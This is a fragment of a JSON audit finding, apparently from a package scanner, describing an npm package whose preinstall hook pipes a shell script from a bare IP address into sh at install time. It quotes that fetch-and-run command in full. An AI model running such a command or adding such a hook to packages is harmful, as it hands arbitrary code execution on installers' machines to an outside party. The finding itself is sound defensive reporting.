  "summary": "preinstall hook pipes remote shell script from bare IP to sh",
  "details": "package.json declares a preinstall lifecycle script that runs `curl -s 216.126.236.46/x.sh | sh`, fetching a shell script from a bare IP over plaintext HTTP and executing it via sh at `npm install` time. The fetched content is unpinned, unverified, and served from an IP address unrelated to any registry or vendor infrastructure, so whoever controls 216.126.236.46 executes arbitrary code on every installer's machine.",
